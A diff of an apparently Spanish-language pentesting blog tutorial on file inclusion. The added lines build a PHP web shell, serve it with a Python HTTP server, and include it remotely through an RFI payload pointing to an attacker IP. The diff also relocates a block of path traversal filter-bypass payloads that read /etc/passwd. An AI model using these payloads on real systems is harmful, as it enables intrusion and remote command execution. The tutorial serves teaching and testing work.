@@ -48,6 +48,33 @@ Esto nos permite no solo visualizar alcance sino también identificar posibles d
 
 Si el servidor está mal configurado o la aplicación es especialmente vulnerable, un atacante podría incluso ser capaz de utilizar una vulnerabilidad LFI para ejecutar código en el servidor.
 
+El RFI principal y más común es el que podemos ir a descargar un archivo desde nuestra máquina atacante, este archivo es lo que nos permitirá ejecutar comandos.
+
+```bash
+┌──(root㉿nptg)-[/home/usr/lfi]
+└─# echo '<?php system($_GET["cmd"]); ?>' > shell.php
+```
+
+Posteriormente nos montamos un servidor web por python.
+
+```bash
+┌──(root㉿nptg)-[/home/usr/lfi]
+└─# python -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+```
+
+Por medio de burpsuite haremos la consulta con el siguiente payload.
+
+```
+/index.php?language=http://10.10.14.13/shell.php&cmd=id
+```
+
+[![lfi9](/images/lfi9.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi9.png)
+
+Podremos comenzar a ejecutar comandos a nivel de sistema.
+
+### Archivo auth.log
+
 En este caso se encontró el archivo ```auth.log```, el cual se usa típicamente para registrar eventos de autenticación, como inicios y cierres de sesión. Es posible por medio del puerto 22 SSH que se permita la interpretación de código que permita un RFI de la siguiente forma sin necesidad de conocer la contraseña:
 
 ```bash
@@ -160,15 +187,6 @@ php://filter/read=convert.base64-encode/resource=<archivo>
 
 Algunas veces en el payload no es necesario agregar su extensión por ejemplo .php.
 
-## Bypass de filtros
-
-```
-....//....//....//....//etc/passwd
-%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
-/..././..././..././..././..././..././..././..././etc/passwd
-
-```
-
 ### RCE con Wrappers
 
 Una forma de ejecutar código en los servidores back-end y obtener control sobre ellos es por medio de wrappers. Algunos payloads son los siguientes:
@@ -199,6 +217,18 @@ por POST -> '<?php system($_GET["cmd"]); ?>'
 ```
 
 [![lfi8](/images/lfi8.png){:target="_blank"}](https://raw.githubusercontent.com/NPTG24/nptg24.github.io/master/images/lfi8.png)
+
+
+## Bypass de filtros
+
+En determinadas circunstancias, la explotación de una vulnerabilidad de inclusión local de ficheros (LFI) se ve obstaculizada por restricciones del propio desarrollo de la aplicación o por mecanismos de defensa externos, como la configuración del WAF. Algunos ejemplos para conseguir el objetivo son los siguientes.
+
+```
+....//....//....//....//etc/passwd
+%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64
+/..././..././..././..././..././..././..././..././etc/passwd
+
+```
 
 ## Recomendaciones
 
